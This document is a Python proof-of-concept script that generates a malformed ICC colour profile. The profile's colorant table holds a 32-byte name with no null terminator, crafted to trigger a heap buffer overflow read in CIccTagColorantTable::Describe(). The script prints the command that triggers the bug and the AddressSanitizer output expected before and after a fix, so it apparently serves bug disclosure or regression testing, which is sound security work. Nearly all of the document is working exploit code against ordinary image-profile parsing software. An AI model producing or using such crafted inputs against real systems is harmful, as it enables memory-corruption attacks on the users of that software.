#!/usr/bin/env python3
"""
Create ICC profile PoC that triggers heap buffer overflow in CIccTagColorantTable::Describe()
The crash occurs when colorant name is exactly 32 bytes (no null terminator).
"""
import struct

def create_icc_header(profile_size):
    """Create minimal ICC v5 profile header"""
    header = bytearray(128)
    
    # Profile size
    struct.pack_into('>I', header, 0, profile_size)
    
    # CMM type: NULL
    struct.pack_into('>4s', header, 4, b'\x00\x00\x00\x00')
    
    # Profile version: 5.0.0
    struct.pack_into('>BBBBxxxx', header, 8, 5, 0, 0, 0)
    
    # Device class: NamedColor (nmcl)
    struct.pack_into('>4s', header, 12, b'nmcl')
    
    # Color space: NoData
    struct.pack_into('>4s', header, 16, b'\x00\x00\x00\x00')
    
    # PCS: NoData
    struct.pack_into('>4s', header, 20, b'\x00\x00\x00\x00')
    
    # Date/Time: 2025-12-21 20:42:00
    struct.pack_into('>HHHHHH', header, 24, 2025, 12, 21, 20, 42, 0)
    
    # Profile signature: acsp
    struct.pack_into('>4s', header, 36, b'acsp')
    
    # Platform: NULL
    struct.pack_into('>4s', header, 40, b'\x00\x00\x00\x00')
    
    # Flags: Embedded
    struct.pack_into('>I', header, 44, 0x00000001)
    
    # Device manufacturer: NULL
    struct.pack_into('>4s', header, 48, b'\x00\x00\x00\x00')
    
    # Device model: NULL
    struct.pack_into('>4s', header, 52, b'\x00\x00\x00\x00')
    
    # Device attributes: reflective | glossy
    struct.pack_into('>Q', header, 56, 0x0000000000000000)
    
    # Rendering intent: Absolute Colorimetric (3)
    struct.pack_into('>I', header, 64, 3)
    
    # Illuminant XYZ: D50
    struct.pack_into('>III', header, 68, 0x0000f6d6, 0x00010000, 0x0000d32d)
    
    # Creator: NULL
    struct.pack_into('>4s', header, 80, b'\x00\x00\x00\x00')
    
    return bytes(header)

def create_colorant_table_tag(num_entries=1):
    """Create ColorantTable tag with 32-byte non-null-terminated name"""
    # Tag signature: clrt
    tag_sig = b'clrt'
    
    # Reserved (4 bytes)
    reserved = b'\x00\x00\x00\x00'
    
    # Number of colorants
    count = struct.pack('>I', num_entries)
    
    # Colorant entry: 32 bytes name + 6 bytes PCS data
    # Fill name with 'A' (0x41) - exactly 32 bytes, NO null terminator
    name = b'A' * 32  # This triggers the overflow!
    
    # PCS Lab values (3x uint16): L=50, a=0, b=0
    pcs_data = struct.pack('>HHH', 0x6400, 0x8000, 0x8000)
    
    entry = name + pcs_data
    
    tag_data = tag_sig + reserved + count + entry
    return tag_data

def create_tag_table(tags):
    """Create tag table with tag entries"""
    tag_count = struct.pack('>I', len(tags))
    
    entries = bytearray()
    offset = 128 + 4 + (len(tags) * 12)  # Header + count + entries
    
    for tag_sig, tag_data in tags:
        sig_bytes = tag_sig.encode('ascii') if isinstance(tag_sig, str) else tag_sig
        entries += sig_bytes
        entries += struct.pack('>I', offset)
        entries += struct.pack('>I', len(tag_data))
        offset += len(tag_data)
    
    return tag_count + bytes(entries)

def create_overflow_poc():
    """Create ICC profile that triggers heap buffer overflow"""
    
    # Create colorant table tag
    colorant_tag = create_colorant_table_tag(num_entries=1)
    
    # Tag table: colorantTableTag
    tags = [
        (b'clrt', colorant_tag),  # colorantTableTag
    ]
    
    tag_table = create_tag_table(tags)
    
    # Calculate total profile size
    profile_size = 128 + len(tag_table) + sum(len(data) for _, data in tags)
    
    # Create header
    header = create_icc_header(profile_size)
    
    # Assemble profile
    profile = bytearray(header)
    profile += tag_table
    for _, tag_data in tags:
        profile += tag_data
    
    return bytes(profile)

if __name__ == '__main__':
    poc = create_overflow_poc()
    
    output_file = 'poc-heap-overflow-colorant.icc'
    with open(output_file, 'wb') as f:
        f.write(poc)
    
    print(f"Created PoC: {output_file} ({len(poc)} bytes)")
    print(f"SHA256: ", end='')
    import hashlib
    print(hashlib.sha256(poc).hexdigest())
    print()
    print("Trigger:")
    print("  export LD_LIBRARY_PATH=Build/IccProfLib:Build/IccXML")
    print(f"  Build/Tools/IccDumpProfile/iccDumpProfile {output_file}")
    print()
    print("Expected (BEFORE fix):")
    print("  AddressSanitizer: heap-buffer-overflow")
    print("  READ of size 154 at CIccTagColorantTable::Describe():8903")
    print()
    print("Expected (AFTER fix):")
    print("  Clean execution, colorant name truncated to 32 bytes")
